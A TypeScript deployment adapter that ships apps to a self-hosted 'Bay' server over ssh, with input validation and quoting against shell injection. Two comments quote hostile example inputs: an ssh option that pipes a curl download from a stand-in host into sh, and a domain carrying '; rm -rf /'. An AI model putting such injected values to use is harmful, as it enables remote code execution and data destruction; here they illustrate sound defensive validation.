import { join } from "node:path";
import { $inject, $store, AlephaError } from "alepha";
import { buildOptions, PackageManagerUtils } from "alepha/cli";
import type { RunnerMethod } from "alepha/command";
import { $logger } from "alepha/logger";
import { FileSystemProvider, ShellProvider } from "alepha/system";
import {
  PlatformAdapter,
  type PlatformContext,
  type PlatformState,
} from "./PlatformAdapter.ts";

/**
 * Deploys to Alepha Bay — a self-hosted application server on a machine you own.
 *
 * **There is no credential here, and that is the design.** This drives the
 * `bay` CLI on the host through the machine's own `ssh` binary, and `bay` is
 * itself a thin client of a unix socket whose permissions the kernel enforces.
 * So authorization is two facts that already exist on the host: the SSH key
 * gets you a shell as some user, and that user's membership in the control
 * group gets you the socket. Nothing is stored under `~/.config`, nothing is
 * refreshed, and nothing can leak into a CI log.
 *
 * This replaced an OAuth device-grant flow against a Bay admin panel — an HTTP
 * API that was never written. What it deploys is unchanged: `alepha build`
 * emits `dist/manifest.json`, `alepha pack` wraps it with `migrations/`, and
 * Bay reads the manifest to decide what to provision. A second description of
 * the same app is exactly the code↔infra drift the derived manifest prevents,
 * which is why `provision` stays empty.
 */
export class BayAdapter extends PlatformAdapter {
  protected readonly log = $logger();
  protected readonly fs = $inject(FileSystemProvider);
  protected readonly shell = $inject(ShellProvider);
  protected readonly pm = $inject(PackageManagerUtils);
  // The workspace's resolved build configuration, read for one question only:
  // whether this app is a static site. See `build`.
  protected readonly buildOptions = $store(buildOptions);

  /**
   * The unix group Bay publishes its control socket to.
   *
   * `defaultControlGroup` on the Go side. A host started with
   * `--control-group` uses another name, so every message that mentions this
   * says which group was looked for rather than asserting there is only one.
   */
  protected readonly controlGroup = "bay-control";

  /**
   * What an app name and an environment name are allowed to look like.
   *
   * Matches the keys Bay itself accepts. Anything else is refused before it
   * reaches a command line — see {@link assertSafe}.
   */
  protected readonly appKeyPattern = /^[a-z0-9][a-z0-9._-]*$/;

  /**
   * A plain hostname. Deliberately excludes `*`: Bay answers ACME over HTTP-01
   * and TLS-ALPN, neither of which can prove a wildcard, so passing one through
   * would fail on the host with a certificate error naming nothing about this
   * configuration.
   */
  protected readonly hostnamePattern =
    /^[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)*$/;

  /**
   * An ssh destination: `host`, `user@host`, or an alias from `~/.ssh/config`.
   *
   * The leading character is the load-bearing part. A value starting with `-`
   * is consumed by ssh as an OPTION rather than a destination, so a "host" of
   * `-oProxyCommand=curl evil.sh|sh` would execute before any remote shell
   * exists. OpenSSH has no reliable `--` terminator, so this pattern is the
   * defence.
   */
  protected readonly destinationPattern =
    /^[A-Za-z0-9_][A-Za-z0-9._-]*(@[A-Za-z0-9][A-Za-z0-9.-]*)?$/;

  /**
   * An absolute filesystem path for `--control-socket`, excluding shell
   * metacharacters.
   *
   * Anchored at both ends like the other patterns here: the value is quoted
   * before it reaches `ssh` (see {@link quote}) too, but validating it up
   * front is what still catches a future caller that forgets to.
   */
  protected readonly socketPathPattern = /^\/[\w./-]+$/;

  /**
   * The Bay this environment deploys to.
   *
   * A Bay is a machine someone owns, so unlike Cloudflare there is no global
   * destination to assume — it has to be configured. Passed to `ssh` verbatim,
   * so it may be an alias from `~/.ssh/config`, which is where a port, an
   * identity file or a jump host belong. `$BAY_HOST` wins so CI needs no edit
   * to a committed config.
   */
  protected host(ctx: PlatformContext): string {
    const configured = process.env.BAY_HOST ?? ctx.envConfig.host;
    if (!configured) {
      throw new AlephaError(
        `No Bay host for environment "${ctx.env}". Set it in alepha.config.ts — ` +
          `platform({ environments: { ${ctx.env}: { adapter: "bay", host: "deploy@bay.example.com" } } }) — ` +
          "or export BAY_HOST.",
      );
    }
    this.assertSafe("host", configured, this.destinationPattern);
    return configured;
  }

  /**
   * The absolute path to Bay's control socket on the host, when this
   * environment needs to say so explicitly.
   *
   * Bay's default root is the *relative* path `./bay-data`, and an ssh
   * command runs non-interactively with cwd `$HOME` — so on any host whose
   * Bay root is not `$HOME/bay-data` (every `--root /var/lib/bay` install,
   * for one), Bay's own guess at the socket path misses and every command
   * this adapter sends fails to find it. `$BAY_SOCKET` on the Bay host is
   * Bay's own escape hatch for this, but it cannot be relied on here: a
   * non-interactive ssh command reads neither `~/.profile` nor, on
   * Debian/Ubuntu's default, `~/.bashrc`, so there is nowhere reliable to
   * export it from. Passing `--control-socket` on every command (see
   * {@link bayArgv}) sidesteps needing a remote shell profile at all.
   *
   * `$BAY_SOCKET` in this process's own environment overrides the config,
   * the same way `$BAY_HOST` overrides {@link host}. Undefined is the normal
   * case: with nothing configured, Bay's own default-root guess is left to
   * work or fail on its own.
   */
  protected socket(ctx: PlatformContext): string | undefined {
    const configured = process.env.BAY_SOCKET ?? ctx.envConfig.socket;
    if (!configured) {
      return undefined;
    }
    this.assertSafe("control socket path", configured, this.socketPathPattern);
    return configured;
  }

  /**
   * Refuses a value that has no business on a command line.
   *
   * `ssh` joins its command arguments into ONE string and hands it to the
   * remote login shell, so the local argv-array form protects nothing on the
   * far side: a domain of `a.com; rm -rf /` would run as two commands. Values
   * are quoted as well (see {@link quote}) — this is the half that still works
   * the day someone adds a field and forgets to quote it.
   *
   * The message names the value and the rule, because "invalid input" sends
   * the reader to the wrong file.
   */
  protected assertSafe(label: string, value: string, pattern: RegExp): void {
    if (!pattern.test(value)) {
      throw new AlephaError(
        `Refusing to put ${label} "${value}" on an ssh command line: it does not match ${pattern}. ` +
          "ssh hands its arguments to the remote login shell as a single string, so a value " +
          "carrying shell metacharacters would run as a command.",
      );
    }
  }

  /**
   * Makes one argument literal for the remote shell.
   *
   * The same rule `NodeShellProvider.buildShellCommand` uses: a plainly safe
   * token is left alone so logs and test assertions stay readable, and
   * everything else is single-quoted — nothing expands inside single quotes,
   * so `;`, backticks, `$(…)` and `|` cannot break out.
   */
  protected quote(value: string): string {
    if (/^[\w./:=@%,+-]+$/.test(value)) {
      return value;
    }
    return `'${value.replaceAll("'", `'\\''`)}'`;
  }

  /**
   * Runs one command on the Bay and returns what it printed.
   *
   * `BatchMode=yes` is not optional: without it a deploy in CI sits at a
   * passphrase prompt forever, and a hung prompt is indistinguishable from a
   * hung deploy. Everything else about the connection — port, identity, jump
   * host, multiplexing — is `~/.ssh/config`'s business, which is the whole
   * reason this shells out to `ssh` instead of speaking the protocol.
   */
  protected async remote(
    ctx: PlatformContext,
    argv: string[],
    options: { stdin?: Uint8Array } = {},
  ): Promise<string> {
    return await this.shell.run(
      [
        "ssh",
        "-o",
        "BatchMode=yes",
        this.host(ctx),
        argv.map((arg) => this.quote(arg)).join(" "),
      ],
      { capture: true, stdin: options.stdin },
    );
  }

  /**
   * Builds the argv for one `bay` subcommand, appending `--control-socket
   * <path>` when one is configured for this environment.
   *
   * Every `bay` subcommand accepts the flag, so every caller that runs one
   * goes through this. `id -nG`, used by {@link login} to check group
   * membership before ever asking `bay` anything, is NOT a Bay command and
   * must never be built with this — the flag would be meaningless to it.
   */
  protected bayArgv(ctx: PlatformContext, args: string[]): string[] {
    const socket = this.socket(ctx);
    return socket
      ? ["bay", ...args, "--control-socket", socket]
      : ["bay", ...args];
  }

  /**
   * The hostnames this environment asks Bay to serve, canonical first.
   *
   * Repeatable AND comma-separated on Bay's side, because both shapes turn up:
   * a hand-typed apex plus `www`, and a value pasted out of a config file. One
   * `--domain` per host is the form that cannot be misparsed.
   *
   * Empty is the normal case: with no domain Bay composes
   * `<name>[-<env>].<baseDomain>` itself, so a workspace that configures
   * nothing still lands somewhere predictable.
   */
  protected domains(ctx: PlatformContext): string[] {
    const configured = ctx.envConfig.domain;
    if (!configured) {
      return [];
    }
    return configured
      .split(",")
      .map((host) => host.trim())
      .filter(Boolean)
      .map((host) => {
        this.assertSafe("domain", host, this.hostnamePattern);
        return host;
      });
  }

  /**
   * Turns whatever `ssh` failed with into a sentence naming the fix.
   *
   * Each branch fails at a different layer and wants a different fix, and
   * several share vocabulary that would misfire if the branches were
   * reordered — each one's comment says which lower branch it would
   * otherwise fall into, and each is a bad diagnosis for that other cause:
   *
   * - "no control socket found" means Bay never even tried to dial anything
   *   — nothing was passed via `--control-socket` and its own relative-path
   *   guess found no file. That is NOT a group problem, so it must not
   *   produce the `usermod` advice below it.
   * - A permission-denied dial naming a `.sock` path IS the group problem:
   *   the socket file was found (its directory is world-readable) but this
   *   user was refused. The expensive one, because the key works and the
   *   shell opens before it surfaces.
   * - `bay` treating `-` as a literal filename means it predates stdin
   *   support and needs upgrading — not that it is missing from PATH.
   * - A dial that fails with "no such file or directory" (rather than
   *   "permission denied") means the configured `socket` path itself is
   *   wrong — the file it names does not exist — which is a config fix, not
   *   a PATH problem or a group problem.
   */
  protected explain(host: string, error: unknown): AlephaError {
    const detail = String(
      (error as { stderr?: string })?.stderr ||
        (error as Error)?.message ||
        error,
    ).trim();

    if (/no control socket found/i.test(detail)) {
      return new AlephaError(
        `Signed in to ${host}, but Bay never found its own control socket — nothing was passed via ` +
          "--control-socket, and its own default guess (a relative path resolved under $HOME) " +
          `missed. Set \`socket\` for this environment in alepha.config.ts to the socket's actual ` +
          `path on the host. (${detail})`,
      );
    }
    if (/permission denied/i.test(detail) && /\.sock/i.test(detail)) {
      // Must stay ahead of the bare "permission denied" branch below, which
      // this text also matches and would misdiagnose as a refused SSH key.
      return new AlephaError(
        `Signed in to ${host}, but Bay's control socket refused that user — it is not in the ` +
          `"${this.controlGroup}" group. On the host: usermod -aG ${this.controlGroup} <user>, ` +
          `then open a new session. (${detail})`,
      );
    }
    if (/open -:/i.test(detail)) {
      // `os.Open("-")` failing is what a `bay` from before "-" meant stdin
      // looks like. Contains "no such file or directory", so it must stay
      // ahead of the generic PATH branch below, which would otherwise claim
      // `bay` isn't installed when it plainly is.
      return new AlephaError(
        `Signed in to ${host}, but its \`bay\` is too old to read the deploy artifact from stdin — ` +
          `it tried to open a file literally named "-". Upgrade \`bay\` on the host. (${detail})`,
      );
    }
    if (
      /dial unix/i.test(detail) &&
      /no such file or directory/i.test(detail)
    ) {
      // Also contains "no such file or directory", so it too must stay ahead
      // of the generic PATH branch below.
      return new AlephaError(
        `Signed in to ${host}, but nothing is listening at the configured control socket path. ` +
          `Check the \`socket\` value for this environment in alepha.config.ts. (${detail})`,
      );
    }
    if (/permission denied|publickey/i.test(detail)) {
      return new AlephaError(
        `${host} refused the SSH key. Add your public key to ~/.ssh/authorized_keys on the host, ` +
          `or point \`host\` at a ~/.ssh/config entry that uses the right one. (${detail})`,
      );
    }
    if (
      /command not found|no such file or directory|\bnot found\b/i.test(detail)
    ) {
      // The third alternative is for `dash`, whose login shell says
      // "bay: not found" rather than "command not found".
      return new AlephaError(
        `Signed in to ${host}, but \`bay\` is not on that user's PATH. Install it, or add its ` +
          `directory to the login shell's PATH — an ssh command runs a non-interactive shell, ` +
          `which reads a different profile. (${detail})`,
      );
    }
    return new AlephaError(`ssh to ${host} failed: ${detail}`);
  }

  /**
   * Checks the Bay answers before anything expensive happens.
   *
   * Probes with `bay list`, not `bay version`: on the Go side `version` is
   * `fmt.Println(version)` — a local constant, printed without ever dialing
   * the control socket. It proves only that ssh works and `bay` is on PATH,
   * so every wrong `socket` path, every missing group membership, and `bay
   * serve` being down would all survive it and only surface after a full
   * build and pack — exactly the two minutes this method's own reason for
   * existing is to save. `list` is the cheapest command that actually reaches
   * the socket, and {@link inspect} already parses its answer.
   *
   * Runs first in `up` precisely so a bad host costs a second rather than a
   * two-minute build.
   */
  async authenticate(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
    const host = this.host(ctx);
    await run({
      name: `check ${host}`,
      handler: async () => {
        try {
          await this.remote(ctx, this.bayArgv(ctx, ["list"]));
        } catch (error) {
          throw this.explain(host, error);
        }
        this.log.info(`Reached ${host} — Bay's control socket answered.`);
      },
    });
  }

  /**
   * Reports whether the SSH key and the group membership are both in place.
   *
   * There is nothing to log into — this adapter stores no credential. The
   * group is checked FIRST, via `id -nG`: a direct, portable answer that does
   * not depend on the exact wording a denied dial happens to produce on this
   * OS, and it skips an ssh round trip to the control socket that would only
   * fail predictably anyway. Only once that passes does this touch the
   * socket at all — with `bay list`, the same probe {@link authenticate}
   * uses — so the closing message is actually earned rather than inferred
   * from `id -nG` alone.
   */
  async login(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
    const host = this.host(ctx);
    await run({
      name: `check ${host}`,
      handler: async () => {
        let groups: string;
        try {
          groups = await this.remote(ctx, ["id", "-nG"]);
        } catch (error) {
          throw this.explain(host, error);
        }
        if (!groups.trim().split(/\s+/).includes(this.controlGroup)) {
          throw new AlephaError(
            `Reached ${host}, but that user is not in the "${this.controlGroup}" group, so Bay's ` +
              `control socket is unreachable. On the host: usermod -aG ${this.controlGroup} <user>, ` +
              "then open a new session. (A Bay started with --control-group uses a different name.)",
          );
        }

        try {
          await this.remote(ctx, this.bayArgv(ctx, ["list"]));
        } catch (error) {
          throw this.explain(host, error);
        }
        this.log.info(
          `Reached ${host}, and that user's membership in "${this.controlGroup}" reaches Bay's ` +
            "control socket — deploys will be accepted.",
        );
      },
    });
  }

  /**
   * Refuses, honestly.
   *
   * Doing nothing quietly would be worse: the user would believe access had
   * been revoked. SSH keys are not Alepha's to revoke, so this says where they
   * actually live.
   */
  async logout(ctx: PlatformContext, _run: RunnerMethod): Promise<void> {
    const host = this.host(ctx);
    throw new AlephaError(
      `Nothing to log out of — this adapter stores no credential. Access to ${host} is your SSH ` +
        "key: remove the public key from ~/.ssh/authorized_keys on the host to revoke it, or drop " +
        `the user from the "${this.controlGroup}" group to stop deploys without closing the account.`,
    );
  }

  /**
   * Composes an `alepha` CLI invocation for whatever package manager the
   * project actually uses.
   *
   * `yarn` was hardcoded, so deploying an npm, pnpm or bun workspace failed at
   * the build step with the package manager's own error — for lindocara, a
   * yarn complaint about a lockfile that does not exist because the project
   * has a `package-lock.json`. Nothing in the message mentioned Bay, the
   * adapter, or yarn being an assumption.
   *
   * Each manager has its own way to run a binary out of `node_modules/.bin`,
   * and only yarn takes it bare. `npm run alepha` was the first attempt at this
   * and is wrong for a different reason: `run` looks for a package.json SCRIPT
   * named `alepha`, which an app has no reason to declare.
   */
  protected async cli(ctx: PlatformContext, args: string): Promise<string> {
    const pm = await this.pm.getPackageManager(ctx.root);
    switch (pm) {
      case "yarn":
        return `yarn alepha ${args}`;
      case "pnpm":
        return `pnpm exec alepha ${args}`;
      case "bun":
        return `bunx alepha ${args}`;
      default:
        return `npx alepha ${args}`;
    }
  }

  /**
   * Builds the artifact Bay consumes.
   *
   * `--target=bare` and nothing else. A workerd bundle is resolved against
   * Cloudflare's export conditions and has no node-runnable entry point, so Bay
   * refuses it at deploy time — better to never produce one.
   */
  async build(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
    if (ctx.prebuilt) {
      // Nothing target-specific to regenerate: there is no wrangler.jsonc
      // equivalent, because everything Bay needs is already in the manifest.
      return;
    }
    /*
      `bare` is forced rather than inherited, and that is deliberate: a
      `cloudflare` target resolves the bundle against workerd's export
      conditions and leaves no entry point node can run, so a workspace
      configured for Cloudflare would otherwise deploy to Bay, fail to boot, and
      report only "never became ready".

      `static` is the one target that must survive, because it is not a
      different way of building a server — it is the absence of one. Forcing
      `bare` over it built a server bundle for a site that has no process,
      shipped it, and left Bay to spawn it.
    */
    const target = this.buildOptions.target === "static" ? "static" : "bare";

    await run({
      name: "build (bay)",
      handler: async () => {
        await this.shell.run(await this.cli(ctx, `build --target=${target}`), {
          root: ctx.root,
        });
      },
    });
  }

  /**
   * Packs the artifact and pipes it into `bay deploy -` in one ssh invocation.
   *
   * Piped rather than staged: `scp` to a temp path would double the artifact on
   * the host's disk, leave litter behind when a deploy dies mid-way, and cost
   * three round trips instead of one.
   */
  async deploy(
    ctx: PlatformContext,
    run: RunnerMethod,
  ): Promise<string | undefined> {
    const host = this.host(ctx);
    this.assertSafe("app name", ctx.project, this.appKeyPattern);
    this.assertSafe("environment", ctx.env, this.appKeyPattern);
    // Validated before `pack` runs: two minutes of work must not precede a
    // rejection that was knowable from the config alone. `socket`'s result
    // is discarded here — it exists purely to validate early; `bayArgv`
    // below re-derives it once there is something to deploy.
    const domains = this.domains(ctx);
    this.socket(ctx);

    let artifact = "";
    await run({
      name: "pack",
      handler: async () => {
        await this.shell.run(await this.cli(ctx, "pack"), { root: ctx.root });
        artifact = join(ctx.root, `${ctx.project}-latest.tar.gz`);
        if (!(await this.fs.exists(artifact))) {
          throw new AlephaError(`\`alepha pack\` produced no ${artifact}.`);
        }
      },
    });

    let url: string | undefined;
    await run({
      name: `deploy → ${host}`,
      handler: async () => {
        const args = ["deploy", "-", "--name", ctx.project, "--env", ctx.env];
        for (const domain of domains) {
          args.push("--domain", domain);
        }

        let answer: string;
        try {
          // `new Uint8Array(...)` copies the buffer `readFile` already holds,
          // so peak memory here is roughly twice the artifact's size. Fine at
          // the ~10 MB an Alepha bundle plus migrations typically is; this
          // does not stream, so a much larger artifact would want a
          // different path.
          answer = await this.remote(ctx, this.bayArgv(ctx, args), {
            stdin: new Uint8Array(await this.fs.readFile(artifact)),
          });
        } catch (error) {
          throw this.explain(host, error);
        }
        url = this.deployedUrl(answer);
      },
    });
    return url;
  }

  /**
   * Pulls the served URL out of what `bay deploy` printed.
   *
   * Returns nothing when the answer is not JSON, rather than turning the text
   * into a link. Anything but JSON means something other than `bay deploy`
   * answered — a login banner, a shell error — and reporting one of those as
   * an address is how `up` finishes green pointing at nothing.
   */
  protected deployedUrl(answer: string): string | undefined {
    try {
      const parsed = JSON.parse(answer);
      return typeof parsed?.url === "string" ? parsed.url : undefined;
    } catch {
      return undefined;
    }
  }

  /**
   * Migrations are the app's own business.
   *
   * Alepha runs them during its own boot as soon as `migrations/` is present
   * next to the bundle, and `alepha pack` always includes it. A migrate step
   * here would either duplicate that or race it.
   */
  async migrate(): Promise<void> {}

  async inspect(
    ctx: PlatformContext,
    _run: RunnerMethod,
  ): Promise<PlatformState> {
    const host = this.host(ctx);
    let answer: string;
    try {
      answer = await this.remote(ctx, this.bayArgv(ctx, ["list"]));
    } catch (error) {
      throw this.explain(host, error);
    }

    let parsed: unknown;
    try {
      parsed = JSON.parse(answer.trim() || "[]");
    } catch {
      // Anything but JSON means something other than `bay list` answered —
      // the same reasoning `deployedUrl` uses for `bay deploy`. Without this,
      // `platform status` against a login banner or a shell error dies on a
      // parse error naming neither Bay nor the host.
      throw new AlephaError(
        `Bay at ${host} answered \`bay list\` with something other than JSON: ${answer.slice(0, 300)}`,
      );
    }
    // `bay list` marshals a nil slice as `null`, not `[]`, on a Bay with
    // nothing deployed. Calling .filter on that throws with a message naming
    // neither Bay nor the empty host.
    const apps =
      (parsed as Array<{
        name: string;
        env: string;
        domains?: string[];
        domain?: string;
        release: string;
      }> | null) ?? [];

    const mine = apps.filter(
      (a) => a.name === ctx.project && a.env === ctx.env,
    );
    return {
      workers: mine.map((a) => ({
        name: `${a.name}/${a.env}`,
        exists: true,
        // `domains` is the live field, canonical first. `domain` is
        // `LegacyDomain` on the Go side — folded into `domains` and cleared on
        // load, so it is absent from anything a current Bay writes. Reading
        // only it reported `undefined` for every app.
        detail: a.domains?.[0] ?? a.domain,
        version: a.release,
      })),
      // Bay provisions these itself, from the manifest, and exposes no
      // inventory of them. Reporting empty lists is honest; inventing entries
      // from the manifest would report intent as fact.
      databases: [],
      buckets: [],
      kvNamespaces: [],
      queues: [],
      secrets: [],
    };
  }

  /**
   * Unregisters the app, keeping its data.
   *
   * Deliberately divergent from Cloudflare, where teardown really destroys. On
   * Cloudflare the data lives in D1 and R2, which outlive the worker; on Bay the
   * database and the uploads sit in the app's own directory, so a naive teardown
   * would delete them with no way back. "Stop serving this" is the usual intent,
   * and destroying data has to be asked for — `bay remove --purge`, on the host.
   */
  async teardown(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
    const host = this.host(ctx);
    this.assertSafe("app name", ctx.project, this.appKeyPattern);
    this.assertSafe("environment", ctx.env, this.appKeyPattern);

    await run({
      name: `remove ${ctx.project}/${ctx.env}`,
      handler: async () => {
        try {
          await this.remote(
            ctx,
            this.bayArgv(ctx, ["remove", `${ctx.project}/${ctx.env}`]),
          );
        } catch (error) {
          const detail = String(
            (error as { stderr?: string })?.stderr ||
              (error as Error)?.message ||
              error,
          );
          // Already gone is the outcome `down` asked for. Failing here would
          // make a re-run of a partly-finished teardown impossible. Both
          // patterns are word-bounded: Bay echoes the app name back in some
          // errors, and an app legitimately named e.g. "app404" must not have
          // an unrelated failure read as "already removed" just because its
          // own name contains "404".
          if (!/\bunknown app\b|\b404\b/i.test(detail)) {
            throw this.explain(host, error);
          }
          this.log.info(
            `${ctx.project}/${ctx.env} was not deployed on ${host}. Nothing to remove.`,
          );
          return;
        }
        this.log.info(
          `Removed ${ctx.project}/${ctx.env} from ${host}. Its database and uploads are kept on the host.`,
        );
      },
    });
  }
}
